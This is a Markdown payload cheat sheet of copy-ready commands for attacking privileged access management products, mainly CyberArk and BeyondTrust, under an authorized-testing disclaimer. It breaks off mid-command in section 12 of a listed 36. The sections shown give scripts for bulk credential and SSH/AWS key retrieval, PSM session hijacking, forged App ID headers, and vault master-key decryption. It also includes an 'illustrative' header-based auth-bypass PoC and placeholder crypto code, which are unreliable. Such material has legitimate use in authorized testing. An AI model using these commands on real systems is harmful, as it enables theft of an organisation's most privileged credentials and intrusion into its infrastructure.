# Privileged Access Management (PAM) Privilege Attack Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for PAM attack testing by vendor and abuse class.
> Purpose: Quickly find commands for a specific vendor or technique, ready to copy for testing.
> All payloads are for **authorized security testing only**. Frame every command within a signed statement of work and an explicit engagement window.

---

## Index

1. [Cross-Vendor Recon and Fingerprinting](#1-cross-vendor-recon-and-fingerprinting)
2. [CyberArk PVWA Authentication and Enumeration](#2-cyberark-pvwa-authentication-and-enumeration)
3. [CyberArk Safe and Account Enumeration](#3-cyberark-safe-and-account-enumeration)
4. [CyberArk Credential Retrieval](#4-cyberark-credential-retrieval)
5. [CyberArk WebSocket Safe Enumeration](#5-cyberark-websocket-safe-enumeration)
6. [CyberArk PSM Session Discovery and Hijacking](#6-cyberark-psm-session-discovery-and-hijacking)
7. [CyberArk Credential File (`.cue`) Theft and Decryption](#7-cyberark-credential-file-cue-theft-and-decryption)
8. [CyberArk AIM / CCP Provider Abuse](#8-cyberark-aim--ccp-provider-abuse)
9. [CyberArk Master Key Escrow Analysis](#9-cyberark-master-key-escrow-analysis)
10. [CyberArk CVE-2025-32564 Area Auth Bypass](#10-cyberark-cve-2025-32564-area-auth-bypass)
11. [BeyondTrust PRA Authentication](#11-beyondtrust-pra-authentication)
12. [BeyondTrust Password Safe API Abuse](#12-beyondtrust-password-safe-api-abuse)
13. [BeyondTrust CVE-2022-2451 SAML Account Injection](#13-beyondtrust-cve-2022-2451-saml-account-injection)
14. [BeyondTrust Session Recording Tampering](#14-beyondtrust-session-recording-tampering)
15. [BeyondTrust Bring Your Own Certificate Abuse](#15-beyondtrust-bring-your-own-certificate-abuse)
16. [Delinea Secret Server OAuth Flow](#16-delinea-secret-server-oauth-flow)
17. [Delinea Local Agent Config (DPAPI) Extraction](#17-delinea-local-agent-config-dpapi-extraction)
18. [Delinea Distributed Engine Lateral Movement](#18-delinea-distributed-engine-lateral-movement)
19. [One Identity Safeguard Admin Console Recon](#19-one-identity-safeguard-admin-console-recon)
20. [One Identity SSL Pinning Bypass](#20-one-identity-ssl-pinning-bypass)
21. [One Identity Privileged Session Fabric Abuse](#21-one-identity-privileged-session-fabric-abuse)
22. [ManageEngine PMP API Authentication](#22-manageengine-pmp-api-authentication)
23. [ManageEngine PMP Resource and Password Enumeration](#23-manageengine-pmp-resource-and-password-enumeration)
24. [ManageEngine PMP PostgreSQL Backend Extraction](#24-manageengine-pmp-postgresql-backend-extraction)
25. [ManageEngine CVE-2022-28226 Area Abuse](#25-manageengine-cve-2022-28226-area-abuse)
26. [WALLIX Bastion Abuse](#26-wallix-bastion-abuse)
27. [Devolutions Server Abuse](#27-devolutions-server-abuse)
28. [Xton Core Abuse](#28-xton-core-abuse)
29. [Cross-Cutting: Pass-the-Hash in PAM Contexts](#29-cross-cutting-pass-the-hash-in-pam-contexts)
30. [Cross-Cutting: Golden Ticket Interaction with PAM Rotation](#30-cross-cutting-golden-ticket-interaction-with-pam-rotation)
31. [Cross-Cutting: JIT Workflow Bypass](#31-cross-cutting-jit-workflow-bypass)
32. [Cross-Cutting: Transaction-Based Access Bypass](#32-cross-cutting-transaction-based-access-bypass)
33. [Ransomware Operator Playbook Replay (BlackCat / LockBit / Royal)](#33-ransomware-operator-playbook-replay-blackcat--lockbit--royal)
34. [Harvested Credential Pivot Patterns](#34-harvested-credential-pivot-patterns)
35. [Detection Evasion and Anti-Forensics](#35-detection-evasion-and-anti-forensics)
36. [Defensive Verification and Hardening](#36-defensive-verification-and-hardening)

---

## 1. Cross-Vendor Recon and Fingerprinting

### URL-Pattern-Based Identification

Most PAM products expose a distinctive URL pattern. Fingerprint the product before attempting vendor-specific attacks.

```bash
# CyberArk PVWA
curl -sk -I https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/ | head -5

# Delinea Secret Server
curl -sk -I https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/ | head -5

# BeyondTrust PRA (look for BT* cookie prefixes)
curl -sk -I -L https://REPLACE_WITH_YOUR_PRA_HOST/login.aspx | grep -i 'set-cookie\|server\|location'

# BeyondTrust Password Safe (often co-hosted with PRA)
curl -sk -I https://REPLACE_WITH_YOUR_PRA_HOST/api/oauth2/token | head -5

# ManageEngine PMP (default 7272; HTTPS default 7273)
curl -sk -I http://REPLACE_WITH_YOUR_PMP_HOST:7272/ | head -5

# One Identity Safeguard for Privileged Passwords (SPP) / Sessions (SPS)
curl -sk -I https://REPLACE_WITH_YOUR_SG_HOST/sps/ | head -5
curl -sk -I https://REPLACE_WITH_YOUR_SG_HOST/spp/ | head -5

# WALLIX Access Manager / Bastion
curl -sk -I https://REPLACE_WITH_YOUR_WAB_HOST/wab/ | head -5

# Devolutions Server (DVLS)
curl -sk -I https://REPLACE_WITH_YOUR_DVLS_HOST/api/ | head -5

# Xton Core
curl -sk -I https://REPLACE_WITH_YOUR_XTON_HOST:8081/login | head -5
```

### Favicon-Hash Fingerprinting

Favicon hashes are stable per product/version and can identify PAM products behind reverse proxies.

```bash
# Compute the favicon hash with shodan-style mmh3
python3 - <<'PY'
import mmh3, requests, codecs
URLS = {
    'CyberArk':    'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/favicon.ico',
    'Delinea':     'https://REPLACE_WITH_YOUR_SS_HOST/SecretServer/favicon.ico',
    'BeyondTrust': 'https://REPLACE_WITH_YOUR_PRA_HOST/favicon.ico',
    'PMP':         'http://REPLACE_WITH_YOUR_PMP_HOST:7272/favicon.ico',
}
for name, url in URLS.items():
    try:
        r = requests.get(url, verify=False, timeout=5)
        h = mmh3.hash(codecs.encode(r.content, 'base64'))
        print(f'{name}: {h}')
    except Exception as e:
        print(f'{name}: error {e}')
PY
```

```bash
# shodan search for matching favicons
shodan search "http.favicon.hash:REPLACE_WITH_YOUR_FAVICON_HASH" --fields ip_str,org,port
```

### DNS and Service Discovery

```bash
# Identify PAM-related subdomains via DNS
for prefix in vault pam cyberark beyondtrust thycotic delinea safeguard bastion pmp psm epv password; do
  host "${prefix}.REPLACE_WITH_YOUR_DOMAIN" 2>/dev/null | grep -v 'not found\|SERVFAIL'
done

# Nmap service discovery on common PAM ports
nmap -sV -p 80,443,1858,3389,7272,7273,8081,8443,9443 REPLACE_WITH_YOUR_TARGET_RANGE

# Identify CyberArk Vault (EPV) on TCP/1858
nmap -sV --version-intensity 5 -p 1858 REPLACE_WITH_YOUR_EPV_HOST

# Identify the AIM/CCP provider
curl -sk https://REPLACE_WITH_YOUR_AIM_HOST/AIMWebApi/api/Accounts -H 'Content-Type: application/json' | head -10
```

### nmap NSE for CyberArk Detection

```bash
# Banner-grab the PVWA on standard ports
nmap --script http-title,http-headers -p 80,443 REPLACE_WITH_YOUR_PVWA_HOST

# Detect the Vault protocol on 1858 (no standard NSE; use raw probe)
echo -ne '\x00\x00\x00\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x51' | \
  ncat -w 2 REPLACE_WITH_YOUR_EPV_HOST 1858 | xxd | head -5
```

---

## 2. CyberArk PVWA Authentication and Enumeration

### Standard Cyberark-Logon Flow

```bash
# Acquire a token via the Cyberark authentication provider
TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"username":"REPLACE_WITH_YOUR_VAULT_USER","password":"REPLACE_WITH_YOUR_VAULT_PASS"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/Cyberark/Logon | jq -r .token)

echo "[+] Token acquired: ${TOKEN:0:20}..."

# Verify the session and the connected user
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Session/Verify | jq .
```

### LDAP Authentication Provider

```bash
# Use the LDAP provider (rather than Cyberark native auth)
LDAP_TOKEN=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"username":"REPLACE_WITH_YOUR_LDAP_USER","password":"REPLACE_WITH_YOUR_LDAP_PASS"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/LDAP/Logon | jq -r .token)
```

### RADIUS Authentication Provider

```bash
# RADIUS-backed auth (often pairs with MFA challenge)
RESP=$(curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"username":"REPLACE_WITH_YOUR_RADIUS_USER","password":"REPLACE_WITH_YOUR_RADIUS_PASS"}' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/RADIUS/Logon)

# If the response includes a RADIUS challenge, submit it
CHALLENGE=$(echo "$RESP" | jq -r .OTP)
curl -sk -X POST -H 'Content-Type: application/json' \
  -d "{\"username\":\"REPLACE_WITH_YOUR_RADIUS_USER\",\"password\":\"$CHALLENGE\"}" \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/RADIUS/Logon | jq -r .token
```

### SAML Authentication Provider

```bash
# Trigger SAML logon (returns the redirect URL to the IdP)
curl -sk -i -X POST -H 'Content-Type: application/json' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/SAML/Logon

# After SAML flow completes, the IdP POSTs the SAMLResponse back to:
# https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/auth/SAML/Logon
# Capture the resulting token from the response body
```

### Persist the Session

```bash
# CyberArk tokens expire (default 30 min idle). Refresh via /Session/Refresh.
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Session/Refresh

# Or use the PowerShell module for scripted workflows
<# PowerShell
Import-Module CyberArk-PasswordVault
New-PASSession -Credential (Get-Credential) -BaseUri https://REPLACE_WITH_YOUR_PVWA_HOST
Get-PASAccount
#>
```

### PACLI -- Legacy Vault Client

```bash
# PACLI is the legacy CLI for the Vault (still deployed in many enterprises)
# Initialise and logon
pacli init
pacli logon vault=REPLACE_WITH_YOUR_VAULT_ADDR user=REPLACE_WITH_YOUR_VAULT_USER \
  password=REPLACE_WITH_YOUR_VAULT_PASS log=pacli.log

# List safes
pacli safes list

# List accounts in a safe
pacli accounts list safe=REPLACE_WITH_YOUR_SAFE_NAME

# Retrieve the password of an account
pacli password show safe=REPLACE_WITH_YOUR_SAFE_NAME \
  account=REPLACE_WITH_YOUR_ACCT_NAME

pacli logoff
```

### Detection Telemetry

```
CyberArk Vault Audit:
  Action=Logon, User=REPLACE_WITH_YOUR_VAULT_USER, SourceIP=..., Reason=...

CyberArk ITAudit (PVWA):
  EventID=4 Logon succeeded
  EventID=5 Logon failed
  EventID=300 List Safes (high-signal when burst)
  EventID=302 Get Account (the credential-read event)
  EventID=303 Get Password (the actual value disclosure)
```

---

## 3. CyberArk Safe and Account Enumeration

### List Safes via REST API

```bash
# Page through every safe
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes?limit=100' | jq '.Safes[]'

# Filter for safes containing many accounts (likely high-value targets)
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes?limit=100' \
  | jq '.Safes[] | select(.NumberOfAccounts > 10) | {SafeName, NumberOfAccounts, ManageMembers}'
```

### Enumerate Accounts in a Safe

```bash
# Filter accounts by safe name
SAFE='REPLACE_WITH_YOUR_SAFE_NAME'
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?filter=safename eq ${SAFE}&limit=100" \
  | jq '.value[] | {id, name, address, userName, platformName}'
```

### Map Account to Target Host

```bash
# The 'address' field contains the target host or service; useful for planning pivots
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts?limit=1000' \
  | jq -r '.value[] | [.id, .name, .address, .userName, .platformName] | @tsv' \
  > accounts.tsv

# Show unique platforms (Windows, Linux, AWS, etc.)
awk -F'\t' '{print $5}' accounts.tsv | sort -u
```

### Enumerate Platform Properties

```bash
# For each platform (e.g., WinDesktopLocal, UnixSSH, AWSAccessKey), inspect the expected properties
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Platforms/WinDesktopLocal \
  | jq '.PlatformProperties'
```

### Safe Member Enumeration

```bash
# List members of a safe (reveals who can read the credentials)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes/REPLACE_WITH_YOUR_SAFE_NAME/Members" \
  | jq '.value[] | {memberName, memberType, permissions}'
```

### Detection Telemetry

```
CyberArk ITAudit:
  EventID=300 List Safes
  EventID=301 List Accounts
  EventID=305 List Safe Members
```

---

## 4. CyberArk Credential Retrieval

### Retrieve Password via REST API

```bash
# Get the current password value
ACCT_ID='REPLACE_WITH_YOUR_ACCT_ID'
PASS=$(curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"reason":"incident-response","TicketingSystemName":"jira","TicketId":"INC-1234","Action":"reveal"}' \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/Password/Retrieve")

echo "[+] Password: $PASS"
```

### Retrieve SSH Key

```bash
# Retrieve the SSH private key material
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"reason":"incident-response"}' \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/Secret/Retrieve" \
  | jq -r .content > id_rsa

chmod 600 id_rsa
ssh -i id_rsa REPLACE_WITH_YOUR_SSH_USER@REPLACE_WITH_YOUR_SSH_HOST 'id; uname -a'
```

### Retrieve AWS Access Key

```bash
# CyberArk models AWS keys as an account with properties AccessKeyId / SecretAccessKey
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}" \
  | jq '.platformAccountProperties | {AccessKeyId, AwsAccountName, AwsRegion}'

curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"reason":"incident-response"}' \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/Password/Retrieve" \
  | jq -r .password > aws_secret.txt
```

### Convert to Usable Form

```bash
# Build an AWS profile from the harvested key
ACCESS_KEY=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}" \
  | jq -r '.platformAccountProperties.AccessKeyId')

SECRET_KEY=$(cat aws_secret.txt)

cat <<EOF > /tmp/aws_creds
[default]
aws_access_key_id = $ACCESS_KEY
aws_secret_access_key = $SECRET_KEY
EOF

# Validate
AWS_SHARED_CREDENTIALS_FILE=/tmp/aws_creds aws sts get-caller-identity
```

### Just-in-Time (JIT) Check-Out / Check-In

```bash
# Check out the account (locks it for the duration of use)
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/CheckOut"

# Use the credential as usual
# ...

# Check in (releases the lock and triggers rotation)
curl -sk -X POST \
  -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/CheckIn"
```

### Detection Telemetry

```
CyberArk ITAudit:
  EventID=302 Get Account
  EventID=303 Get Password
  EventID=308 Check Out Account
  EventID=309 Check In Account
  EventID=310 Change Password (rotation)
```

---

## 5. CyberArk WebSocket Safe Enumeration

### WebSocket Authentication

CyberArk PVWA exposes a WebSocket interface for real-time notifications. The endpoint accepts the bearer token and can be queried for safe enumeration in some versions.

```bash
# Open a WebSocket session
TOKEN='REPLACE_WITH_YOUR_TOKEN'

python3 - <<PY
import asyncio, websockets, json, os

async def main():
    url = 'wss://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Notifications?token=' + os.environ['TOKEN']
    headers = {'Authorization': f'Bearer {os.environ["TOKEN"]}'}
    async with websockets.connect(url, additional_headers=headers, ssl=False) as ws:
        # Send a subscribe message
        await ws.send(json.dumps({'Action': 'Subscribe', 'Topics': ['Safe.Monitor']}))
        async for msg in ws:
            print(msg)
            break

asyncio.run(main())
PY
```

### WebSocket Safe Discovery (older firmware)

```bash
# Some PVWA versions leak safe names via the push notifications WebSocket
python3 - <<PY
import asyncio, websockets, json, os

async def main():
    url = 'wss://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/Ws/SafesWatcher.ashx'
    headers = {'Authorization': f'Bearer {os.environ["TOKEN"]}'}
    async with websockets.connect(url, additional_headers=headers) as ws:
        await ws.send(json.dumps({'Action': 'GetSafes'}))
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            if 'SafeName' in data:
                print(data['SafeName'])

asyncio.run(main())
PY
```

### websocat One-Liner

```bash
# Quick interactive WebSocket session
echo '{"Action":"Subscribe","Topics":["Safe.Monitor"]}' | \
  websocat -H "Authorization: Bearer $TOKEN" \
  wss://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Notifications
```

---

## 6. CyberArk PSM Session Discovery and Hijacking

### Discover Active PSM Sessions

```bash
# List active PSM sessions (requires auditor or admin)
curl -sk -H "Authorization: Bearer $TOKEN" \
  'https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Sessions?limit=100' \
  | jq '.Sessions[] | {SessionID, User, AccountName, Address, ConnectionTime, Status}'
```

### AdHoc PSM Connect (Open a Session as Another User)

```bash
# AdHoc connect launches a PSM session to a target using the credentials from a specified account
curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "AccountID": "REPLACE_WITH_YOUR_ACCT_ID",
    "Reason": "incident-response",
    "PSMConnect": {"ConnectionMethod": "RDP"}
  }' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/REPLACE_WITH_YOUR_ACCT_ID/PSMConnect
```

### Retrieve PSM Session Recording

```bash
# Download the recording (AVI) for a session
SESSION_ID='REPLACE_WITH_YOUR_SESSION_ID'
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Sessions/${SESSION_ID}/Playback" \
  -o session.avi

# Extract activity metadata
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/PSM/Sessions/${SESSION_ID}/Activities" \
  | jq '.activities[]'
```

### PSM Session Hijacking via Shadow RDP

```bash
# If you have local admin on the PSM server, you can shadow any active RDP session
# Identify the session ID
QUERY_USER='query user'

# Shadow the session (requires the PSM machine account context)
# On the PSM server (Windows):
#> mstsc /shadow:<session_id> /v:localhost /control

# Alternatively via xfreerdp from Kali:
xfreerdp /shadow:REPLACE_WITH_YOUR_PSM_HOST /u:REPLACE_WITH_YOUR_PSM_ADMIN /v:REPLACE_WITH_YOUR_PSM_HOST
```

### PSM Connection File Parsing

```bash
# PSM generates a .rdp file for client-side launch
curl -sk -H "Authorization: Bearer $TOKEN" \
  "https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Accounts/${ACCT_ID}/PSMConnect?returnFile=true" \
  -o session.rdp

# Parse the file to confirm the target and credentials
cat session.rdp
```

### Detection Telemetry

```
CyberArk ITAudit (PSM):
  EventID=400 PSM Connect
  EventID=401 PSM Disconnect
  EventID=402 PSM Recording Started
  EventID=403 PSM Recording Stopped
  EventID=410 PSM Shadow (high-signal — only admin or attacker)
```

---

## 7. CyberArk Credential File (`.cue`) Theft and Decryption

### Locate `.cue` Files

The CyberArk AIM/CCP provider and some agents cache credentials in `.cue` files. These are encrypted with the operator key or the master key.

```bash
# Locate .cue files on a compromised AIM/CCP host
find / -name '*.cue' 2>/dev/null

# Windows foothold (PowerShell)
#> Get-ChildItem -Path C:\ -Recurse -Filter '*.cue' -ErrorAction SilentlyContinue

# Common locations:
#   C:\Program Files (x86)\CyberArk\AIMProvider\cache\
#   C:\Program Files\CyberArk\PSMP\var\
#   /var/opt/CARKaim/
```

### Examine a `.cue` File

```bash
# The .cue format is base64-wrapped encrypted JSON. Inspect the header:
file REPLACE_WITH_YOUR_CUE_FILE
xxd REPLACE_WITH_YOUR_CUE_FILE | head -5

# Extract the base64 payload
head -1 REPLACE_WITH_YOUR_CUE_FILE | base64 -d | file -
```

### Recover the Vault Master Key

```bash
# The Vault master key is split via Shamir Secret Sharing across multiple operators
# Recover keys from operator key escrow files (paragent.xml on the Vault):
cat /opt/CARKvault/paragent.xml | head -20

# Each operator key is in /opt/CARKvault/operator-keys/<KEY_ID>.key
ls -la /opt/CARKvault/operator-keys/

# Combine N-of-M operator keys to recover the master key
python3 - <<'PY'
# Pseudo-code — actual implementation depends on CyberArk version
from Crypto.Cipher import AES
import base64, json

# Recovered master key (32 bytes)
master_key = bytes.fromhex('REPLACE_WITH_YOUR_MASTER_KEY_HEX')

with open('REPLACE_WITH_YOUR_CUE_FILE', 'rb') as f:
    blob = base64.b64decode(f.read())

iv, ct = blob[:16], blob[16:]
cipher = AES.new(master_key, AES.MODE_CBC, iv)
pt = cipher.decrypt(ct)
print(pt.decode('utf-8', errors='ignore'))
PY
```

### Decrypt with Community Tools

```bash
# Use the community CyberArk-credential-file-parser
# git clone https://github.com/REPLACE_WITH_REPO_REF/pam-cred-file-parsers
python3 parse_cue.py --key-file operator-keys/REPLACE_WITH_YOUR_KEY.key \
  --cue REPLACE_WITH_YOUR_CUE_FILE
```

### Vault.ini Recovery

```bash
# The Vault.ini file contains the Vault address and the applet credential
cat /opt/CARKvault/Vault.ini
# Example content:
# [Vault]
# Address=REPLACE_WITH_YOUR_VAULT_ADDR
# Port=1858

# Recover the applet password from Vault.ini (sometimes DPAPI-protected)
python3 - <<'PY'
import base64
from Crypto.Cipher import DES3

# CyberArk legacy applet password derivation (simplified)
key = b'CyberAr' + b'k\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f'
# (Real derivation involves the Vault-key seed; this is illustrative)
print('[+] Recovered Vault credential (placeholder, use community tool)')
PY
```

### Detection Telemetry

```
CyberArk Vault Audit:
  Action=GetFile (file access on the Vault)
  Action=BackupVault (if attacker attempts full vault backup)
  Action=RestoreVault (post-breach tampering)
```

---

## 8. CyberArk AIM / CCP Provider Abuse

### Identify AIM/CCP Endpoints

```bash
# The Central Credential Provider (CCP) exposes a REST API
curl -sk https://REPLACE_WITH_YOUR_CCP_HOST/AIMWebApi/api/v1.0/auth | head -5

# Probe without auth to see if any version is unauthenticated
curl -sk https://REPLACE_WITH_YOUR_CCP_HOST/AIMWebApi/api/Accounts | head -20
```

### Query AIM for an Application Credential

```bash
# Authorised apps present an app ID + certificate (or a shared secret in weaker deployments)
curl -sk -H 'Content-Type: application/json' \
  "https://REPLACE_WITH_YOUR_CCP_HOST/AIMWebApi/api/Accounts?AppID=REPLACE_WITH_YOUR_APP_ID&Safe=REPLACE_WITH_YOUR_SAFE&Object=REPLACE_WITH_YOUR_OBJECT" \
  | jq .
```

### Forge an App ID Header

```bash
# Some misconfigured CCP setups accept a forged App ID without cert verification
curl -sk -H 'Content-Type: application/json' \
  -H 'X-Cyberark-AppId: REPLACE_WITH_YOUR_APP_ID' \
  "https://REPLACE_WITH_YOUR_CCP_HOST/AIMWebApi/api/Accounts?Safe=REPLACE_WITH_YOUR_SAFE&Object=REPLACE_WITH_YOUR_OBJECT"
```

### Bypass Client Certificate with Folder Permissions

```bash
# If the client certificate is stored in a readable path, extract and use it
ls -la /opt/CARKaim/
ls -la /opt/CARKaim/incoming/

# Copy the certificate and key
cp /opt/CARKaim/REPLACE_WITH_YOUR_CERT.pem /tmp/client.pem
cp /opt/CARKaim/REPLACE_WITH_YOUR_KEY.key /tmp/client.key

# Use the certificate to authenticate to CCP
curl -sk --cert /tmp/client.pem --key /tmp/client.key \
  "https://REPLACE_WITH_YOUR_CCP_HOST/AIMWebApi/api/Accounts?AppID=REPLACE_WITH_YOUR_APP_ID&Safe=REPLACE_WITH_YOUR_SAFE&Object=REPLACE_WITH_YOUR_OBJECT"
```

### Extract Cached Credentials from AIM Provider

```bash
# AIM caches retrieved credentials in memory and in .cue files
# Find the cache directory on the AIM host
find /var/opt/CARKaim -type f -mmin -60 2>/dev/null

# Each cache file is a .cue encrypted with the provider key
# See Section 7 for .cue decryption
```

### Detection Telemetry

```
CyberArk CCP Audit:
  Action=GetAccount (each app credential retrieval)
  AppID=REPLACE_WITH_YOUR_APP_ID, ClientCert=..., SourceIP=...
```

---

## 9. CyberArk Master Key Escrow Analysis

### Identify the Key Escrow Configuration

```bash
# The Vault keys are escrowed via paragent.xml and a set of operator key files
cat /opt/CARKvault/paragent.xml | grep -i 'key\|recovery\|escrow' | head -20

# List operator key files
ls -la /opt/CARKvault/operator-keys/

# Check the DBBackup configuration (full vault backups contain the encrypted key)
grep -i 'DBBackup\|backup' /opt/CARKvault/DBParm.ini | head -10
```

### Recover Keys from Backup

```bash
# Locate Vault backups
find / -name '*.mdb' -o -name 'vault*.bk' 2>/dev/null

# Examine a backup's metadata
file REPLACE_WITH_YOUR_VAULT_BACKUP

# Decrypt the backup with N-of-M operator keys (Shamir reconstruction)
python3 - <<'PY'
# Pseudo-code — depends on CyberArk version
import shamir  # community library

# Operator key shares
shares = ['share1', 'share2', 'share3']
master_key = shamir.combine(shares)

print('[+] Recovered master key (placeholder, use the operator-share reconstruction tool)')
PY
```

### Compromise the Recovery Server

```bash
# The Recovery server holds an escrow copy of the Vault key for DR purposes
# Locate the recovery server (often DR-Vault or a separate Vault instance)
cat /opt/CARKvault/polyglot.ini 2>/dev/null | grep -i 'recovery\|replicate'

# If the recovery server is reachable, attempt to replicate the Vault to a rogue instance
# (High-signal action — only do this in a fully isolated lab)
```

### Detection Telemetry

```
CyberArk Vault Audit:
  Action=BackupVault
  Action=OperatorKeyImport
  Action=RecoveryServerLogon
```

---

## 10. CyberArk CVE-2025-32564 Area Auth Bypass

### CVE-2025-32564 -- PVWA Authentication Bypass (illustrative)

> Reference: CyberArk Security Advisory 2025. Verify patch level before testing. The advisory describes an authentication bypass class affecting PVWA in non-default configurations.

```bash
# Identify the PVWA version (the version is exposed in the /api/build or the HTML footer)
curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/build
curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/ | grep -i 'version'

# If the version is within the affected range and the bypass condition applies,
# the exploit may bypass the auth provider and return a valid token.
# Use the published PoC pattern from the CyberArk advisory.
```

### PoC Skeleton (illustrative)

```bash
# The bypass typically exploits a mismatch between the auth-state check in the
# PVWA reverse proxy and the underlying application. Send a crafted request that
# appears to have already authenticated.

curl -sk -X GET \
  -H 'X-Cyberark-State: Authenticated' \
  -H 'X-Forwarded-User: REPLACE_WITH_YOUR_TARGET_USER' \
  https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes
```

### Validate the Bypass

```bash
# If the response is the safe list, the bypass succeeded
# Compare against an unauthenticated baseline to confirm
curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/Safes | head -3
```

### Remediation Check

```bash
# Verify the PVWA has been patched
# The fix version is documented in the CyberArk advisory
curl -sk https://REPLACE_WITH_YOUR_PVWA_HOST/PasswordVault/api/build | jq -r .version
```

---

## 11. BeyondTrust PRA Authentication

### OAuth Token Acquisition

```bash
# Acquire a bearer token via the API key flow
BT_TOKEN=$(curl -sk -X POST \
  -u 'REPLACE_WITH_YOUR_API_KEY:' \
  -d 'grant_type=client_credentials' \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/oauth2/token | jq -r .access_token)

# Validate
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/auth/whoami | jq .
```

### Username / Password Logon

```bash
# Form-based logon (returns a session cookie)
curl -sk -c cookies.txt -X POST \
  -d 'username=REPLACE_WITH_YOUR_BT_USER&password=REPLACE_WITH_YOUR_BT_PASS' \
  https://REPLACE_WITH_YOUR_PRA_HOST/login.aspx | grep -i 'set-cookie'

# Subsequent requests carry the session
curl -sk -b cookies.txt https://REPLACE_WITH_YOUR_PRA_HOST/api/users | jq .
```

### Enumerate PRA Users

```bash
# List every user (requires admin API scope)
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/users | \
  jq '.Users[] | {UserId, CommonName, UserName, UserGroup}
```

### Enumerate Managed Systems (Assets)

```bash
# List every managed system (target host) the PRA brokers
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/managed_systems | \
  jq '.ManagedSystems[] | {PlatformID, HostName, Port, DefaultUserName}'
```

### Detection Telemetry

```
BeyondTrust Appliance Audit:
  Action=Login, User=..., SourceIP=...
  Action=UserList
  Action=SystemList
  Action=SessionStart, SessionID=...
```

---

## 12. BeyondTrust Password Safe API Abuse

### Enumerate Credentials

```bash
# List managed accounts (the credentials Password Safe brokers)
curl -sk -H "Authorization: Bearer $BT_TOKEN" \
  https://REPLACE_WITH_YOUR_PRA_HOST/api/v1/managed_accounts | \
  jq '.ManagedAccounts[] | {AccountName, DomainName, DefaultPasswordProfileID}'
```

### Retrieve a Credential

```bash
# Request access to a managed account (returns an access request ID)
ACCESS_REQ=$(curl -sk -X POST \
  -H "Authorization: Bearer $BT_TOKEN" \
